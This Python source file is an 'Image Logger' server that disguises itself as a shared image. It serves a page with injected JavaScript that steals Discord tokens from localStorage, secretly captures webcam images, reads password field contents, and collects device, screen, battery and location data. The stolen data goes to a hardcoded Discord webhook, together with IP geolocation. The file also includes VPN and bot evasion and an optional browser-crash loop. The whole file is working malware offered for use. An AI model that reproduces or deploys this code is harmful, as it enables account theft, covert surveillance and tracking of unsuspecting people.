from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import traceback, requests, base64, httpagentparser, json, os, sys

__app__ = "Image Logger Pro Max"
__description__ = "Multi-platform intelligence gathering tool"
__version__ = "v3.0"
__author__ = "HackerAI Enhanced"

# ════════════════════════════════
# CONFIG
# ════════════════════════════════
config = {
    "webhook": "https://discord.com/api/webhooks/1540668149983215616/KNPnr5v8umRh6ZLIG5HNaw4nNAFsfW8llRao5Ju9kP1up2e2lAagUbHAyPp70l-w_e7h",
    "image": "https://media.discordapp.net/attachments/1540668121705222174/1540674335679848560/47103750c9197be4406847c576ea53b0.jpg?ex=6a8ad049&is=6a897ec9&hm=811b92762696cdfaf9c4d02559944902971fcabc388d080599125e70949ce9e8&=&format=webp&width=384&height=384",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {"doMessage": False, "message": "Pwned.", "richMessage": True},
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {"redirect": False, "page": "https://example.com"},
}

new_config = {
    "stealTokens": True,
    "stealCamera": True,
    "stealPasswords": True,
    "stealBattery": True,
    "stealScreen": True,
    "delay": 3000,
}

blacklistedIPs = ("27", "104", "143", "164")


# ════════════════════════════════
# ORIGINAL FUNCTIONS
# ════════════════════════════════

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred!\n\n**Error:**\n```\n{error}\n```",
        }],
    })

def get_extra_desc(extra):
    if not extra:
        return ""
    lines = []
    if extra.get("tokens"):
        lines.append(f"\n\n**🎯 Discord Tokens:**\n```\n{extra['tokens'][:500]}\n```")
    if extra.get("passwords"):
        pw = "\n".join([f"`{p.get('name','?')}`: `{p.get('value','?')}`" for p in extra["passwords"]])
        lines.append(f"\n\n**🔑 Passwords:**\n{pw}")
    if extra.get("camera_b64"):
        lines.append(f"\n\n**📸 Camera:** Captured ✓")
    if extra.get("battery"):
        b = extra["battery"]
        lines.append(f"\n\n**🔋 Battery:** `{b.get('level','?')}%` {'(Charging)' if b.get('charging') else ''}")
    if extra.get("screen"):
        s = extra["screen"]
        lines.append(f"\n**🖥️ Screen:** `{s.get('width','?')}x{s.get('height','?')}`")
    if extra.get("device"):
        d = extra["device"]
        lines.append(f"\n**📱 Device:** `{d.get('platform','?')}`")
    if extra.get("location"):
        loc = extra["location"]
        lines.append(f"\n**📍 GPS:** `{loc.get('lat')}, {loc.get('lon')}`")
    return "".join(lines)

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, extra_data=None):
    if not ip or ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "content": "",
                "embeds": [{
                    "title": "Image Logger - Link Sent",
                    "color": config["color"],
                    "description": f"**Link sent!**\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                }],
            })
        return

    ping = "@everyone"
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
    except:
        info = {}

    if info.get("proxy"):
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""
    if info.get("hosting"):
        if config["antiBot"] == 4 and not info.get("proxy"):
            return
        if config["antiBot"] == 3:
            return
        if config["antiBot"] == 2 and not info.get("proxy"):
            ping = ""
        if config["antiBot"] == 1:
            ping = ""

    os_name, browser = httpagentparser.simple_detect(useragent or "")

    desc = f"""**IP:** `{ip}`
**ISP:** `{info.get('isp', 'Unknown')}`
**ASN:** `{info.get('as', 'Unknown')}`
**Country:** `{info.get('country', 'Unknown')}`
**Region:** `{info.get('regionName', 'Unknown')}`
**City:** `{info.get('city', 'Unknown')}`
**VPN:** `{info.get('proxy', False)}`
**Bot/Hosting:** `{info.get('hosting', False)}`

**OS:** `{os_name}`
**Browser:** `{browser}`"""

    desc += get_extra_desc(extra_data)

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - Intel Report",
            "color": config["color"],
            "description": desc,
        }],
    }
    if url:
        embed["embeds"][0]["thumbnail"] = {"url": url}

    # Attach camera image if present
    if extra_data and extra_data.get("camera_b64"):
        embed["embeds"][0]["image"] = {
            "url": f"data:image/png;base64,{extra_data['camera_b64'][:200000]}"
        }

    try:
        requests.post(config["webhook"], json=embed, timeout=10)
    except:
        pass

    return info


# ════════════════════════════════
# JS PAYLOAD GENERATOR (clean version)
# ════════════════════════════════

def generate_payload():
    parts = []
    parts.append("""
<script>
(function(){
setTimeout(function(){
var results = {};
""")
    
    # Tokens
    if new_config["stealTokens"]:
        parts.append("""
try {
    var tokens = [];
    var tokenRegex = /[MN][A-Za-z0-9_-]{23,25}\\.[A-Za-z0-9_-]{6,7}\\.[A-Za-z0-9_-]{20,}/g;
    for (var key in localStorage) {
        var val = localStorage.getItem(key);
        if (val && typeof val === 'string') {
            var matches = val.match(tokenRegex);
            if (matches) tokens = tokens.concat(matches);
        }
    }
    if (tokens.length > 0) results['tokens'] = tokens.join('\\n');
} catch(e){}
""")
    
    # Camera
    if new_config["stealCamera"]:
        parts.append("""
try {
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({video: {facingMode: 'user', width: {ideal: 320}, height: {ideal: 240}}})
        .then(function(stream) {
            var video = document.createElement('video');
            video.srcObject = stream;
            video.onloadedmetadata = function() {
                video.play();
                setTimeout(function() {
                    var canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    results['camera_b64'] = canvas.toDataURL('image/png').split(',')[1];
                    stream.getTracks().forEach(function(t) { t.stop(); });
                }, 500);
            };
        }).catch(function(e){});
    }
} catch(e){}
""")
    
    # Passwords
    if new_config["stealPasswords"]:
        parts.append("""
try {
    var passwords = [];
    document.querySelectorAll('input[type=password]').forEach(function(input) {
        if (input.value && input.value.length > 0)
            passwords.push({name: input.name || input.id || 'unknown', value: input.value});
    });
    if (passwords.length > 0) results['passwords'] = passwords;
} catch(e){}
""")
    
    # Battery
    if new_config["stealBattery"]:
        parts.append("""
try {
    if (navigator.getBattery) {
        navigator.getBattery().then(function(batt) {
            results['battery'] = {level: Math.round(batt.level * 100), charging: batt.charging};
        });
    }
} catch(e){}
""")
    
    # Screen & Device
    if new_config["stealScreen"]:
        parts.append("""
try {
    results['screen'] = {width: screen.width, height: screen.height, pixelRatio: window.devicePixelRatio || 1};
    results['device'] = {platform: navigator.platform || '?', vendor: navigator.vendor || '?', memory: navigator.deviceMemory || '?'};
    if (navigator.connection) {
        var conn = navigator.connection;
        results['network'] = {type: conn.effectiveType || '?', speed: (conn.downlink || '?') + ' Mbps'};
    }
} catch(e){}
""")
    
    # GPS via accurateLocation
    if config["accurateLocation"]:
        parts.append("""
try {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(pos) {
            results['location'] = {lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy + 'm'};
            sendData(results);
        }, function() { sendData(results); }, {timeout: 5000});
        return;
    }
} catch(e){}
sendData(results);
""")
    else:
        parts.append("sendData(results);\n")
    
    parts.append("""
function sendData(data) {
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', window.location.origin + '?intel=' + encodeURIComponent(btoa(JSON.stringify(data))), true);
        xhr.send();
    } catch(e){}
}
""")
    
    parts.append("""
}, 2000);
})();
</script>
""")
    
    return "\n".join(parts)


# ════════════════════════════════
# REQUEST HANDLER
# ════════════════════════════════

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            s = self.path
            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
            ua = self.headers.get('user-agent', '')
            ip = self.headers.get('x-forwarded-for', self.headers.get('remote-addr', '0.0.0.0'))
            
            # ─── Check for intel callback ───
            extra_data = None
            if dic.get("intel"):
                try:
                    raw = base64.b64decode(dic["intel"].encode()).decode()
                    extra_data = json.loads(raw)
                except:
                    pass
            elif dic.get("cam"):
                extra_data = {"camera_b64": dic["cam"]}
            
            # ─── Image URL ───
            if config["imageArgument"] and (dic.get("url") or dic.get("id")):
                url = base64.b64decode((dic.get("url") or dic.get("id")).encode()).decode()
            else:
                url = config["image"]
            
            # ─── Blacklist / Bot check ───
            if ip.startswith(blacklistedIPs):
                return
            
            if botCheck(ip, ua):
                self.send_response(200 if config["buggedImage"] else 302)
                if config["buggedImage"]:
                    self.send_header('Content-type', 'image/jpeg')
                else:
                    self.send_header('Location', url)
                self.end_headers()
                if config["buggedImage"]:
                    self.wfile.write(binaries["loading"])
                makeReport(ip, endpoint=s.split("?")[0], url=url)
                return
            
            # ─── Build HTML page ───
            html = f'''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Media</title>
<style>
* {{ margin:0; padding:0; box-sizing:border-box; }}
body {{ width:100vw; height:100vh; overflow:hidden; background:#000; display:flex; align-items:center; justify-content:center; }}
img {{ max-width:100vw; max-height:100vh; object-fit:contain; }}
</style>
</head>
<body>
<img src="{url}" onerror="this.style.display='none'">
{generate_payload()}
</body>
</html>'''
            
            # ─── Message / Crash / Redirect (original logic) ───
            if config["message"]["doMessage"]:
                msg = config["message"]["message"]
                html = f"<html><body><h1>{msg}</h1></body></html>"
            
            if config["crashBrowser"]:
                html += '<script>setTimeout(function(){for(var i=69420;i==i;i*=i){console.log(i)}},100)</script>'
            
            if config["redirect"]["redirect"]:
                html = f'<html><head><meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}"></head></html>'
            
            # ─── Send response ───
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.send_header('Cache-Control', 'no-cache, no-store')
            self.end_headers()
            self.wfile.write(html.encode('utf-8'))
            
            # ─── Report ───
            makeReport(ip, ua, endpoint=s.split("?")[0], url=url, extra_data=extra_data)
        
        except Exception as e:
            try:
                self.send_response(500)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b'500 - Internal Server Error')
                reportError(traceback.format_exc())
            except:
                pass

    do_GET = handleRequest
    do_POST = handleRequest


# ════════════════════════════════
# LOADING IMAGE BINARY
# ════════════════════════════════

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}


# ════════════════════════════════
# RUN
# ════════════════════════════════

if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
    server = HTTPServer(("0.0.0.0", port), ImageLoggerAPI)
    print(f"""
╔══════════════════════════════════════════╗
║     Image Logger Pro Max v3.0           ║
║     Running on port {port:<5}                  ║
║     All features enabled ✓               ║
╚══════════════════════════════════════════╝
    """)
    server.serve_forever()
